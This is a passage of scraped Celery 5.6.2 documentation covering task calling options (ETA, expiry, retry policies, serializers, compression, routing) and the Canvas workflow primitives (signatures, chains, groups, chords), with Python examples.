this:\n\n@app.task(bind=True)\ndef hello(self, a, b):\n    time.sleep(1)\n    self.update_state(state=\"PROGRESS\", meta={'progress': 50})\n    time.sleep(1)\n    self.update_state(state=\"PROGRESS\", meta={'progress': 90})\n    time.sleep(1)\n    return 'hello world: %i' % (a+b)\n\ndef on_raw_message(body):\n    print(body)\n\na, b = 1, 1\nr = hello.apply_async(args=(a, b))\nprint(r.get(on_message=on_raw_message, propagate=False))\n\n\nWill generate output like this:\n\n{'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7',\n 'result': {'progress': 50},\n 'children': [],\n 'status': 'PROGRESS',\n 'traceback': None}\n{'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7',\n 'result': {'progress': 90},\n 'children': [],\n 'status': 'PROGRESS',\n 'traceback': None}\n{'task_id': '5660d3a3-92b8-40df-8ccc-33a5d1d680d7',\n 'result': 'hello world: 10',\n 'children': [],\n 'status': 'SUCCESS',\n 'traceback': None}\nhello world: 10\n\nETA and Countdown\n\nThe ETA (estimated time of arrival) lets you set a specific date and time that is the earliest time at which your task will be executed. countdown is a shortcut to set ETA by seconds into the future.\n\n>>> result = add.apply_async((2, 2), countdown=3)\n>>> result.get()    # this takes at least 3 seconds to return\n4\n\n\nThe task is guaranteed to be executed at some time after the specified date and time, but not necessarily at that exact time. Possible reasons for broken deadlines may include many items waiting in the queue, or heavy network latency. To make sure your tasks are executed in a timely manner you should monitor the queue for congestion. Use Munin, or similar tools, to receive alerts, so appropriate action can be taken to ease the workload. See Munin.\n\nWhile countdown is an integer, eta must be a datetime object, specifying an exact date and time (including millisecond precision, and timezone information):\n\n>>> from datetime import datetime, timedelta, timezone\n\n>>> tomorrow = datetime.now(timezone.utc) + timedelta(days=1)\n>>> add.apply_async((2, 2), eta=tomorrow)\n\n\nWarning\n\nTasks with eta or countdown are immediately fetched by the worker and until the scheduled time passes, they reside in the worker’s memory. When using those options to schedule lots of tasks for a distant future, those tasks may accumulate in the worker and make a significant impact on the RAM usage.\n\nMoreover, tasks are not acknowledged until the worker starts executing them. If using Redis as a broker, task will get redelivered when countdown exceeds visibility_timeout (see Caveats).\n\nTherefore, using eta and countdown is not recommended for scheduling tasks for a distant future. Ideally, use values no longer than several minutes. For longer durations, consider using database-backed periodic tasks, e.g. with https://pypi.org/project/django-celery-beat/ if using Django (see Using custom scheduler classes).\n\nWarning\n\nWhen using RabbitMQ as a message broker when specifying a countdown over 15 minutes, you may encounter the problem that the worker terminates with an PreconditionFailed error will be raised:\n\namqp.exceptions.PreconditionFailed: (0, 0): (406) PRECONDITION_FAILED - consumer ack timed out on channel\n\n\nIn RabbitMQ since version 3.8.15 the default value for consumer_timeout is 15 minutes. Since version 3.8.17 it was increased to 30 minutes. If a consumer does not ack its delivery for more than the timeout value, its channel will be closed with a PRECONDITION_FAILED channel exception. See Delivery Acknowledgement Timeout for more information.\n\nTo solve the problem, in RabbitMQ configuration file rabbitmq.conf you should specify the consumer_timeout parameter greater than or equal to your countdown value. For example, you can specify a very large value of consumer_timeout = 31622400000, which is equal to 1 year in milliseconds, to avoid problems in the future.\n\nExpiration\n\nThe expires argument defines an optional expiry time, either as seconds after task publish, or a specific date and time using datetime:\n\n>>> # Task expires after one minute from now.\n>>> add.apply_async((10, 10), expires=60)\n\n>>> # Also supports datetime\n>>> from datetime import datetime, timedelta, timezone\n>>> add.apply_async((10, 10), kwargs,\n...                 expires=datetime.now(timezone.utc) + timedelta(days=1))\n\n\nWhen a worker receives an expired task it will mark the task as REVOKED (TaskRevokedError).\n\nMessage Sending Retry\n\nCelery will automatically retry sending messages in the event of connection failure, and retry behavior can be configured – like how often to retry, or a maximum number of retries – or disabled all together.\n\nTo disable retry you can set the retry execution option to False:\n\nadd.apply_async((2, 2), retry=False)\n\n\nRelated Settings\n\ntask_publish_retry\n\n\t\n\ntask_publish_retry_policy\n\nRetry Policy\n\nA retry policy is a mapping that controls how retries behave, and can contain the following keys:\n\nmax_retries\n\nMaximum number of retries before giving up, in this case the exception that caused the retry to fail will be raised.\n\nA value of None means it will retry forever.\n\nThe default is to retry 3 times.\n\ninterval_start\n\nDefines the number of seconds (float or integer) to wait between retries. Default is 0 (the first retry will be instantaneous).\n\ninterval_step\n\nOn each consecutive retry this number will be added to the retry delay (float or integer). Default is 0.2.\n\ninterval_max\n\nMaximum number of seconds (float or integer) to wait between retries. Default is 0.2.\n\nretry_errors\n\nretry_errors is a tuple of exception classes that should be retried. It will be ignored if not specified. Default is None (ignored).\n\nFor example, if you want to retry only tasks that were timed out, you can use TimeoutError:\n\nfrom kombu.exceptions import TimeoutError\n\nadd.apply_async((2, 2), retry=True, retry_policy={\n    'max_retries': 3,\n    'retry_errors': (TimeoutError, ),\n})\n\n\nAdded in version 5.3.\n\nFor example, the default policy correlates to:\n\nadd.apply_async((2, 2), retry=True, retry_policy={\n    'max_retries': 3,\n    'interval_start': 0,\n    'interval_step': 0.2,\n    'interval_max': 0.2,\n    'retry_errors': None,\n})\n\n\nthe maximum time spent retrying will be 0.4 seconds. It’s set relatively short by default because a connection failure could lead to a retry pile effect if the broker connection is down – For example, many web server processes waiting to retry, blocking other incoming requests.\n\nConnection Error Handling\n\nWhen you send a task and the message transport connection is lost, or the connection cannot be initiated, an OperationalError error will be raised:\n\n>>> from proj.tasks import add\n>>> add.delay(2, 2)\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"celery/app/task.py\", line 388, in delay\n        return self.apply_async(args, kwargs)\n  File \"celery/app/task.py\", line 503, in apply_async\n    **options\n  File \"celery/app/base.py\", line 662, in send_task\n    amqp.send_task_message(P, name, message, **options)\n  File \"celery/backends/rpc.py\", line 275, in on_task_call\n    maybe_declare(self.binding(producer.channel), retry=True)\n  File \"/opt/celery/kombu/kombu/messaging.py\", line 204, in _get_channel\n    channel = self._channel = channel()\n  File \"/opt/celery/py-amqp/amqp/connection.py\", line 272, in connect\n    self.transport.connect()\n  File \"/opt/celery/py-amqp/amqp/transport.py\", line 100, in connect\n    self._connect(self.host, self.port, self.connect_timeout)\n  File \"/opt/celery/py-amqp/amqp/transport.py\", line 141, in _connect\n    self.sock.connect(sa)\n  kombu.exceptions.OperationalError: [Errno 61] Connection refused\n\n\nIf you have retries enabled this will only happen after retries are exhausted, or when disabled immediately.\n\nYou can handle this error too:\n\n>>> from celery.utils.log import get_logger\n>>> logger = get_logger(__name__)\n\n>>> try:\n...     add.delay(2, 2)\n... except add.OperationalError as exc:\n...     logger.exception('Sending task raised: %r', exc)\n\n\nNote\n\nWith RabbitMQ, these errors only indicate the broker is unreachable. Messages can still be silently dropped when the broker hits resource limits. Enable confirm_publish in broker_transport_options to detect this.\n\nSerializers\n\nSecurity\n\nThe pickle module allows for execution of arbitrary functions, please see the security guide.\n\nCelery also comes with a special serializer that uses cryptography to sign your messages.\n\nData transferred between clients and workers needs to be serialized, so every message in Celery has a content_type header that describes the serialization method used to encode it.\n\nThe default serializer is JSON, but you can change this using the task_serializer setting, or for each individual task, or even per message.\n\nThere’s built-in support for JSON, pickle, YAML and msgpack, and you can also add your own custom serializers by registering them into the Kombu serializer registry\n\nSee also\n\nMessage Serialization in the Kombu user guide.\n\nEach option has its advantages and disadvantages.\n\njson – JSON is supported in many programming languages, is now\n\na standard part of Python (since 2.6), and is fairly fast to decode.\n\nThe primary disadvantage to JSON is that it limits you to the following data types: strings, Unicode, floats, Boolean, dictionaries, and lists. Decimals and dates are notably missing.\n\nBinary data will be transferred using Base64 encoding, increasing the size of the transferred data by 34% compared to an encoding format where native binary types are supported.\n\nHowever, if your data fits inside the above constraints and you need cross-language support, the default setting of JSON is probably your best choice.\n\nSee http://json.org for more information.\n\nNote\n\n(From Python official docs https://docs.python.org/3.6/library/json.html) Keys in key/value pairs of JSON are always of the type str. When a dictionary is converted into JSON, all the keys of the dictionary are coerced to strings. As a result of this, if a dictionary is converted into JSON and then back into a dictionary, the dictionary may not equal the original one. That is, loads(dumps(x)) != x if x has non-string keys.\n\nWarning\n\nWith more complex workflows created using Canvas: Designing Work-flows, the JSON serializer has been observed to drastically inflate message sizes due to recursive references, leading to resource issues. The pickle serializer is not vulnerable to this and may therefore be preferable in such cases.\n\npickle – If you have no desire to support any language other than\n\nPython, then using the pickle encoding will gain you the support of all built-in Python data types (except class instances), smaller messages when sending binary files, and a slight speedup over JSON processing.\n\nSee pickle for more information.\n\nyaml – YAML has many of the same characteristics as json,\n\nexcept that it natively supports more data types (including dates, recursive references, etc.).\n\nHowever, the Python libraries for YAML are a good bit slower than the libraries for JSON.\n\nIf you need a more expressive set of data types and need to maintain cross-language compatibility, then YAML may be a better fit than the above.\n\nTo use it, install Celery with:\n\n$ pip install celery[yaml]\n\n\nSee http://yaml.org/ for more information.\n\nmsgpack – msgpack is a binary serialization format that’s closer to JSON\n\nin features. The format compresses better, so is a faster to parse and encode compared to JSON.\n\nTo use it, install Celery with:\n\n$ pip install celery[msgpack]\n\n\nSee http://msgpack.org/ for more information.\n\nTo use a custom serializer you need to add the content type to accept_content. By default, only JSON is accepted, and tasks containing other content headers are rejected.\n\nThe following order is used to decide the serializer used when sending a task:\n\nThe serializer execution option.\n\nThe Task.serializer attribute\n\nThe task_serializer setting.\n\nExample setting a custom serializer for a single task invocation:\n\n>>> add.apply_async((10, 10), serializer='json')\n\nCompression\n\nCelery can compress messages using the following builtin schemes:\n\nbrotli\n\nbrotli is optimized for the web, in particular small text documents. It is most effective for serving static content such as fonts and html pages.\n\nTo use it, install Celery with:\n\n$ pip install celery[brotli]\n\n\nbzip2\n\nbzip2 creates smaller files than gzip, but compression and decompression speeds are noticeably slower than those of gzip.\n\nTo use it, please ensure your Python executable was compiled with bzip2 support.\n\nIf you get the following ImportError:\n\n>>> import bz2\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nImportError: No module named 'bz2'\n\n\nit means that you should recompile your Python version with bzip2 support.\n\ngzip\n\ngzip is suitable for systems that require a small memory footprint, making it ideal for systems with limited memory. It is often used to generate files with the “.tar.gz” extension.\n\nTo use it, please ensure your Python executable was compiled with gzip support.\n\nIf you get the following ImportError:\n\n>>> import gzip\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nImportError: No module named 'gzip'\n\n\nit means that you should recompile your Python version with gzip support.\n\nlzma\n\nlzma provides a good compression ratio and executes with fast compression and decompression speeds at the expense of higher memory usage.\n\nTo use it, please ensure your Python executable was compiled with lzma support and that your Python version is 3.3 and above.\n\nIf you get the following ImportError:\n\n>>> import lzma\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nImportError: No module named 'lzma'\n\n\nit means that you should recompile your Python version with lzma support.\n\nAlternatively, you can also install a backport using:\n\n$ pip install celery[lzma]\n\n\nzlib\n\nzlib is an abstraction of the Deflate algorithm in library form which includes support both for the gzip file format and a lightweight stream format in its API. It is a crucial component of many software systems - Linux kernel and Git VCS just to name a few.\n\nTo use it, please ensure your Python executable was compiled with zlib support.\n\nIf you get the following ImportError:\n\n>>> import zlib\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nImportError: No module named 'zlib'\n\n\nit means that you should recompile your Python version with zlib support.\n\nzstd\n\nzstd targets real-time compression scenarios at zlib-level and better compression ratios. It’s backed by a very fast entropy stage, provided by Huff0 and FSE library.\n\nTo use it, install Celery with:\n\n$ pip install celery[zstd]\n\n\nYou can also create your own compression schemes and register them in the kombu compression registry.\n\nThe following order is used to decide the compression scheme used when sending a task:\n\nThe compression execution option.\n\nThe Task.compression attribute.\n\nThe task_compression attribute.\n\nExample specifying the compression used when calling a task:\n\n>>> add.apply_async((2, 2), compression='zlib')\n\nConnections\n\nAutomatic Pool Support\n\nSince version 2.3 there’s support for automatic connection pools, so you don’t have to manually handle connections and publishers to reuse connections.\n\nThe connection pool is enabled by default since version 2.5.\n\nSee the broker_pool_limit setting for more information.\n\nYou can handle the connection manually by creating a publisher:\n\nnumbers = [(2, 2), (4, 4), (8, 8), (16, 16)]\nresults = []\nwith add.app.pool.acquire(block=True) as connection:\n    with add.get_publisher(connection) as publisher:\n        try:\n            for i, j in numbers:\n                res = add.apply_async((i, j), publisher=publisher)\n                results.append(res)\nprint([res.get() for res in results])\n\n\nThough this particular example is much better expressed as a group:\n\n>>> from celery import group\n\n>>> numbers = [(2, 2), (4, 4), (8, 8), (16, 16)]\n>>> res = group(add.s(i, j) for i, j in numbers).apply_async()\n\n>>> res.get()\n[4, 8, 16, 32]\n\nRouting options\n\nCelery can route tasks to different queues.\n\nSimple routing (name <-> name) is accomplished using the queue option:\n\nadd.apply_async(queue='priority.high')\n\n\nYou can then assign workers to the priority.high queue by using the workers -Q argument:\n\n$ celery -A proj worker -l INFO -Q celery,priority.high\n\n\nSee also\n\nHard-coding queue names in code isn’t recommended, the best practice is to use configuration routers (task_routes).\n\nTo find out more about routing, please see Routing Tasks.\n\nResults options\n\nYou can enable or disable result storage using the task_ignore_result setting or by using the ignore_result option:\n\n>>> result = add.apply_async((1, 2), ignore_result=True)\n>>> result.get()\nNone\n\n>>> # Do not ignore result (default)\n...\n>>> result = add.apply_async((1, 2), ignore_result=False)\n>>> result.get()\n3\n\n\nIf you’d like to store additional metadata about the task in the result backend set the result_extended setting to True.\n\nNote\n\nresult_extended controls what Celery includes as extended task metadata, but it does not automatically add scheduler-specific metadata. For example, some integrations (e.g. https://pypi.org/project/django-celery-beat/ together with https://pypi.org/project/django-celery-results/) may record the periodic task name in the result backend only when the scheduler provides it as part of the published message.\n\nWhen you call tasks manually using apply_async/delay, that periodic task context is usually not present unless you add it explicitly (e.g. via message headers/properties in apply_async options). For example:\n\nresult = task.apply_async(\n    headers={\"periodic_task_name\": \"task_name\"},\n)\n\n\nSee also\n\nFor more information on tasks, please see Tasks.\n\nAdvanced Options\n\nThese options are for advanced users who want to take use of AMQP’s full routing capabilities. Interested parties may read the routing guide.\n\nexchange\n\nName of exchange (or a kombu.entity.Exchange) to send the message to.\n\nrouting_key\n\nRouting key used to determine.\n\npriority\n\nA number between 0 and 255, where 255 is the highest priority.\n\nSupported by: RabbitMQ, Redis (priority reversed, 0 is highest).\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nTasks\n\nNext topic\n\nCanvas: Designing Work-flows\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Calling Tasks\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491570,
    "timestamp": "2026-02-23T00:13:49.288Z",
    "title": "Canvas: Designing Work-flows — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/canvas.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Canvas: Designing Work-flows\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nCanvas: Designing Work-flows\n\nSignatures\n\nPartials\n\nImmutability\n\nCallbacks\n\nThe Primitives\n\nChains\n\nGroups\n\nChords\n\nMap & Starmap\n\nChunks\n\nStamping\n\nCanvas stamping\n\nCustom stamping\n\nCallbacks stamping\n\nSignatures\n\nAdded in version 2.0.\n\nYou just learned how to call a task using the tasks delay method in the calling guide, and this is often all you need, but sometimes you may want to pass the signature of a task invocation to another process or as an argument to another function.\n\nA signature() wraps the arguments, keyword arguments, and execution options of a single task invocation in a way such that it can be passed to functions or even serialized and sent across the wire.\n\nYou can create a signature for the add task using its name like this:\n\n>>> from celery import signature\n>>> signature('tasks.add', args=(2, 2), countdown=10)\ntasks.add(2, 2)\n\n\nThis task has a signature of arity 2 (two arguments): (2, 2), and sets the countdown execution option to 10.\n\nor you can create one using the task’s signature method:\n\n>>> add.signature((2, 2), countdown=10)\ntasks.add(2, 2)\n\n\nThere’s also a shortcut using star arguments:\n\n>>> add.s(2, 2)\ntasks.add(2, 2)\n\n\nKeyword arguments are also supported:\n\n>>> add.s(2, 2, debug=True)\ntasks.add(2, 2, debug=True)\n\n\nFrom any signature instance you can inspect the different fields:\n\n>>> s = add.signature((2, 2), {'debug': True}, countdown=10)\n>>> s.args\n(2, 2)\n>>> s.kwargs\n{'debug': True}\n>>> s.options\n{'countdown': 10}\n\n\nIt supports the “Calling API” of delay, apply_async, etc., including being called directly (__call__).\n\nCalling the signature will execute the task inline in the current process:\n\n>>> add(2, 2)\n4\n>>> add.s(2, 2)()\n4\n\n\ndelay is our beloved shortcut to apply_async taking star-arguments:\n\n>>> result = add.delay(2, 2)\n>>> result.get()\n4\n\n\napply_async takes the same arguments as the app.Task.apply_async() method:\n\n>>> add.apply_async(args, kwargs, **options)\n>>> add.signature(args, kwargs, **options).apply_async()\n\n>>> add.apply_async((2, 2), countdown=1)\n>>> add.signature((2, 2), countdown=1).apply_async()\n\n\nYou can’t define options with s(), but a chaining set call takes care of that:\n\n>>> add.s(2, 2).set(countdown=1)\nproj.tasks.add(2, 2)\n\nPartials\n\nWith a signature, you can execute the task in a worker:\n\n>>> add.s(2, 2).delay()\n>>> add.s(2, 2).apply_async(countdown=1)\n\n\nOr you can call it directly in the current process:\n\n>>> add.s(2, 2)()\n4\n\n\nSpecifying additional args, kwargs, or options to apply_async/delay creates partials:\n\nAny arguments added will be prepended to the args in the signature:\n\n>>> partial = add.s(2)          # incomplete signature\n>>> partial.delay(4)            # 4 + 2\n>>> partial.apply_async((4,))  # same\n\n\nAny keyword arguments added will be merged with the kwargs in the signature, with the new keyword arguments taking precedence:\n\n>>> s = add.s(2, 2)\n>>> s.delay(debug=True)                    # -> add(2, 2, debug=True)\n>>> s.apply_async(kwargs={'debug': True})  # same\n\n\nAny options added will be merged with the options in the signature, with the new options taking precedence:\n\n>>> s = add.signature((2, 2), countdown=10)\n>>> s.apply_async(countdown=1)  # countdown is now 1\n\n\nYou can also clone signatures to create derivatives:\n\n>>> s = add.s(2)\nproj.tasks.add(2)\n\n>>> s.clone(args=(4,), kwargs={'debug': True})\nproj.tasks.add(4, 2, debug=True)\n\nImmutability\n\nAdded in version 3.0.\n\nPartials are meant to be used with callbacks, any tasks linked, or chord callbacks will be applied with the result of the parent task. Sometimes you want to specify a callback that doesn’t take additional arguments, and in that case you can set the signature to be immutable:\n\n>>> add.apply_async((2, 2), link=reset_buffers.signature(immutable=True))\n\n\nThe .si() shortcut can also be used to create immutable signatures:\n\n>>> add.apply_async((2, 2), link=reset_buffers.si())\n\n\nOnly the execution options can be set when a signature is immutable, so it’s not possible to call the signature with partial args/kwargs.\n\nNote\n\nIn this tutorial I sometimes use the prefix operator ~ to signatures. You probably shouldn’t use it in your production code, but it’s a handy shortcut when experimenting in the Python shell:\n\n>>> ~sig\n\n>>> # is the same as\n>>> sig.delay().get()\n\nCallbacks\n\nAdded in version 3.0.\n\nCallbacks can be added to any task using the link argument to apply_async:\n\nadd.apply_async((2, 2), link=other_task.s())\n\n\nThe callback will only be applied if the task exited successfully, and it will be applied with the return value of the parent task as argument.\n\nAs I mentioned earlier, any arguments you add to a signature, will be prepended to the arguments specified by the signature itself!\n\nIf you have the signature:\n\n>>> sig = add.s(10)\n\n\nthen sig.delay(result) becomes:\n\n>>> add.apply_async(args=(result, 10))\n\n\n…\n\nNow let’s call our add task with a callback using partial arguments:\n\n>>> add.apply_async((2, 2), link=add.s(8))\n\n\nAs expected this will first launch one task calculating , then another task calculating .\n\nThe Primitives\n\nAdded in version 3.0.\n\nOverview\n\ngroup\n\nThe group primitive is a signature that takes a list of tasks that should be applied in parallel.\n\nchain\n\nThe chain primitive lets us link together signatures so that one is called after the other, essentially forming a chain of callbacks.\n\nchord\n\nA chord is just like a group but with a callback. A chord consists of a header group and a body, where the body is a task that should execute after all of the tasks in the header are complete.\n\nmap\n\nThe map primitive works like the built-in map function, but creates a temporary task where a list of arguments is applied to the task. For example, task.map([1, 2]) – results in a single task being called, applying the arguments in order to the task function so that the result is:\n\nres = [task(1), task(2)]\n\n\nstarmap\n\nWorks exactly like map except the arguments are applied as *args. For example add.starmap([(2, 2), (4, 4)]) results in a single task calling:\n\nres = [add(2, 2), add(4, 4)]\n\n\nchunks\n\nChunking splits a long list of arguments into parts, for example the operation:\n\n>>> items = zip(range(1000), range(1000))  # 1000 items\n>>> add.chunks(items, 10)\n\n\nwill split the list of items into chunks of 10, resulting in 100 tasks (each processing 10 items in sequence).\n\nThe primitives are also signature objects themselves, so that they can be combined in any number of ways to compose complex work-flows.\n\nHere’re some examples:\n\nSimple chain\n\nHere’s a simple chain, the first task executes passing its return value to the next task in the chain, and so on.\n\n>>> from celery import chain\n\n>>> # 2 + 2 + 4 + 8\n>>> res = chain(add.s(2, 2), add.s(4), add.s(8))()\n>>> res.get()\n16\n\n\nThis can also be written using pipes:\n\n>>> (add.s(2, 2) | add.s(4) | add.s(8))().get()\n16\n\n\nImmutable signatures\n\nSignatures can be partial so arguments can be added to the existing arguments, but you may not always want that, for example if you don’t want the result of the previous task in a chain.\n\nIn that case you can mark the signature as immutable, so that the arguments cannot be changed:\n\n>>> add.signature((2, 2), immutable=True)\n\n\nThere’s also a .si() shortcut for this, and this is the preferred way of creating signatures:\n\n>>> add.si(2, 2)\n\n\nNow you can create a chain of independent tasks instead:\n\n>>> res = (add.si(2, 2) | add.si(4, 4) | add.si(8, 8))()\n>>> res.get()\n16\n\n>>> res.parent.get()\n8\n\n>>> res.parent.parent.get()\n4\n\n\nSimple group\n\nYou can easily create a group of tasks to execute in parallel:\n\n>>> from celery import group\n>>> res = group(add.s(i, i) for i in range(10))()\n>>> res.get(timeout=1)\n[0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n\n\nSimple chord\n\nThe chord primitive enables us to add a callback to be called when all of the tasks in a group have finished executing. This is often required for algorithms that aren’t embarrassingly parallel:\n\n>>> from celery import chord\n>>> res = chord((add.s(i, i) for i in range(10)), tsum.s())()\n>>> res.get()\n90\n\n\nThe above example creates 10 tasks that all start in parallel, and when all of them are complete the return values are combined into a list and sent to the tsum task.\n\nThe body of a chord can also be immutable, so that the return value of the group isn’t passed on to the callback:\n\n>>> chord((import_contact.s(c) for c in contacts),\n...       notify_complete.si(import_id)).apply_async()\n\n\nNote the use of .si above; this creates an immutable signature, meaning any new arguments passed (including to return value of the previous task) will be ignored.\n\nBlow your mind by combining\n\nChains can be partial too:\n\n>>> c1 = (add.s(4) | mul.s(8))\n\n# (16 + 4) * 8\n>>> res = c1(16)\n>>> res.get()\n160\n\n\nthis means that you can combine chains:\n\n# ((4 + 16) * 2 + 4) * 8\n>>> c2 = (add.s(4, 16) | mul.s(2) | (add.s(4) | mul.s(8)))\n\n>>> res = c2()\n>>> res.get()\n352\n\n\nChaining a group together with another task will automatically upgrade it to be a chord:\n\n>>> c3 = (group(add.s(i, i) for i in range(10)) | tsum.s())\n>>> res = c3()\n>>> res.get()\n90\n\n\nGroups and chords accepts partial arguments too, so in a chain the return value of the previous task is forwarded to all tasks in the group:\n\n>>> new_user_workflow = (create_user.s() | group(\n...                      import_contacts.s(),\n...                      send_welcome_email.s()))\n... new_user_workflow.delay(username='artv',\n...                         first='Art',\n...                         last='Vandelay',\n...                         email='art@vandelay.com')\n\n\nIf you don’t want to forward arguments to the group then you can make the signatures in the group immutable:\n\n>>> res = (add.s(4, 4) | group(add.si(i, i) for i in range(10)))()\n>>> res.get()\n[0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n\n>>> res.parent.get()\n8\n\n\nWarning\n\nWith more complex workflows, the default JSON serializer has been observed to drastically inflate message sizes due to recursive references, leading to resource issues. The pickle serializer is not vulnerable to this and may therefore be preferable in such cases.\n\nChains\n\nAdded in version 3.0.\n\nTasks can be linked together: the linked task is called when the task returns successfully:\n\n>>> res = add.apply_async((2, 2), link=mul.s(16))\n>>> res.get()\n4\n\n\nThe linked task will be applied with the result of its parent task as the first argument. In the above case where the result was 4, this will result in mul(4, 16).\n\nThe results will keep track of any subtasks called by the original task, and this can be accessed from the result instance:\n\n>>> res.children\n[<AsyncResult: 8c350acf-519d-4553-8a53-4ad3a5c5aeb4>]\n\n>>> res.children[0].get()\n64\n\n\nThe result instance also has a collect() method that treats the result as a graph, enabling you to iterate over the results:\n\n>>> list(res.collect())\n[(<AsyncResult: 7b720856-dc5f-4415-9134-5c89def5664e>, 4),\n (<AsyncResult: 8c350acf-519d-4553-8a53-4ad3a5c5aeb4>, 64)]\n\n\nBy default collect() will raise an IncompleteStream exception if the graph isn’t fully formed (one of the tasks hasn’t completed yet), but you can get an intermediate representation of the graph too:\n\n>>> for result, value in res.collect(intermediate=True):\n....\n\n\nYou can link together as many tasks as you like, and signatures can be linked too:\n\n>>> s = add.s(2, 2)\n>>> s.link(mul.s(4))\n>>> s.link(log_result.s())\n\n\nYou can also add error callbacks using the on_error method:\n\n>>> add.s(2, 2).on_error(log_error.s()).delay()\n\n\nThis will result in the following .apply_async call when the signature is applied:\n\n>>> add.apply_async((2, 2), link_error=log_error.s())\n\n\nThe worker won’t actually call the errback as a task, but will instead call the errback function directly so that the raw request, exception and traceback objects can be passed to it.\n\nHere’s an example errback:\n\nimport os\n\nfrom proj.celery import app\n\n@app.task\ndef log_error(request, exc, traceback):\n    with open(os.path.join('/var/errors', request.id), 'a') as fh:\n        print('--\\n\\n{0} {1} {2}'.format(\n            request.id, exc, traceback), file=fh)\n\n\nTo make it even easier to link tasks together there’s a special signature called chain that lets you chain tasks together:\n\n>>> from celery import chain\n>>> from proj.tasks import add, mul\n\n>>> # (4 + 4) * 8 * 10\n>>> res = chain(add.s(4, 4), mul.s(8), mul.s(10))\nproj.tasks.add(4, 4) | proj.tasks.mul(8) | proj.tasks.mul(10)\n\n\nCalling the chain will call the tasks in the current process and return the result of the last task in the chain:\n\n>>> res = chain(add.s(4, 4), mul.s(8), mul.s(10))()\n>>> res.get()\n640\n\n\nIt also sets parent attributes so that you can work your way up the chain to get intermediate results:\n\n>>> res.parent.get()\n64\n\n>>> res.parent.parent.get()\n8\n\n>>> res.parent.parent\n<AsyncResult: eeaad925-6778-4ad1-88c8-b2a63d017933>\n\n\nChains can also be made using the | (pipe) operator:\n\n>>> (add.s(2, 2) | mul.s(8) | mul.s(10)).apply_async()\n\nTask ID\n\nAdded in version 5.4.\n\nA chain will inherit the task id of the last task in the chain.\n\nGraphs\n\nIn addition you can work with the result graph as a DependencyGraph:\n\n>>> res = chain(add.s(4, 4), mul.s(8), mul.s(10))()\n\n>>> res.parent.parent.graph\n285fa253-fcf8-42ef-8b95-0078897e83e6(1)\n    463afec2-5ed4-4036-b22d-ba067ec64f52(0)\n872c3995-6fa0-46ca-98c2-5a19155afcf0(2)\n    285fa253-fcf8-42ef-8b95-0078897e83e6(1)\n        463afec2-5ed4-4036-b22d-ba067ec64f52(0)\n\n\nYou can even convert these graphs to dot format:\n\n>>> with open('graph.dot', 'w') as fh:\n...     res.parent.parent.graph.to_dot(fh)\n\n\nand create images:\n\n$ dot -Tpng graph.dot -o graph.png\n\nGroups\n\nAdded in version 3.0.\n\nNote\n\nSimilarly to chords, tasks used in a group must not ignore their results. See “Important Notes” for more information.\n\nA group can be used to execute several tasks in parallel.\n\nThe group function takes a list of signatures:\n\n>>> from celery import group\n>>> from proj.tasks import add\n\n>>> group(add.s(2, 2), add.s(4, 4))\n(proj.tasks.add(2, 2), proj.tasks.add(4, 4))\n\n\nIf you call the group, the tasks will be applied one after another in the current process, and a GroupResult instance is returned that can be used to keep track of the results, or tell how many tasks are ready and so on:\n\n>>> g = group(add.s(2, 2), add.s(4, 4))\n>>> res = g()\n>>> res.get()\n[4, 8]\n\n\nGroup also supports iterators:\n\n>>> group(add.s(i, i) for i in range(100))()\n\n\nA group is a signature object, so it can be used in combination with other signatures.\n\nGroup Callbacks and Error Handling\n\nGroups can have callback and errback signatures linked to them as well, however the behaviour can be somewhat surprising due to the fact that groups are not real tasks and simply pass linked tasks down to their encapsulated signatures. This means that the return values of a group are not collected to be passed to a linked callback signature. Additionally, linking the task will not guarantee that it will activate only when all group tasks have finished. As an example, the following snippet using a simple add(a, b) task is faulty since the linked add.s() signature will not receive the finalised group result as one might expect.\n\n>>> g = group(add.s(2, 2), add.s(4, 4))\n>>> g.link(add.s())\n>>> res = g()\n[4, 8]\n\n\nNote that the finalised results of the first two tasks are returned, but the callback signature will have run in the background and raised an exception since it did not receive the two arguments it expects.\n\nGroup errbacks are passed down to encapsulated signatures as well which opens the possibility for an errback linked only once to be called more than once if multiple tasks in a group were to fail. As an example, the following snippet using a fail() task which raises an exception can be expected to invoke the log_error() signature once for each failing task which gets run in the group.\n\n>>> g = group(fail.s(), fail.s())\n>>> g.link_error(log_error.s())\n>>> res = g()\n\n\nWith this in mind, it’s generally advisable to create idempotent or counting tasks which are tolerant to being called repeatedly for use as errbacks.\n\nThese use cases are better addressed by the chord class which is supported on certain backend implementations.\n\nGroup Results\n\nThe group task returns a special result too, this result works just like normal task results, except that it works on the group as a whole:\n\n>>> from celery import group\n>>> from tasks import add\n\n>>> job = group([\n...             add.s(2, 2),\n...             add.s(4, 4),\n...             add.s(8, 8),\n...             add.s(16, 16),\n...             add.s(32, 32),\n... ])\n\n>>> result = job.apply_async()\n\n>>> result.ready()  # have all subtasks completed?\nTrue\n>>> result.successful() # were all subtasks successful?\nTrue\n>>> result.get()\n[4, 8, 16, 32, 64]\n\n\nThe GroupResult takes a list of AsyncResult instances and operates on them as if it was a single task.\n\nIt supports the following operations:\n\nsuccessful()\n\nReturn True if all of the subtasks finished successfully (e.g., didn’t raise an exception).\n\nfailed()\n\nReturn True if any of the subtasks failed.\n\nwaiting()\n\nReturn True if any of the subtasks isn’t ready yet.\n\nready()\n\nReturn True if all of the subtasks are ready.\n\ncompleted_count()\n\nReturn the number of completed subtasks. Note that complete means successful in this context. In other words, the return value of this method is the number of successful 